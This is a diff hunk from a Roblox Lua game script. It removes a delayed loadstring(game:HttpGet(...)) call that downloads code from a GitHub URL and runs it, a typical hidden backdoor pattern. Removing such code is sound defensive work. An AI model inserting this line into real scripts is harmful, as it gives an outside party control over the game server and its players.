@@ -1187,6 +1187,3 @@ game.Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
-
-wait(10)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HuiScripts/odh/refs/heads/main/Loading"))()
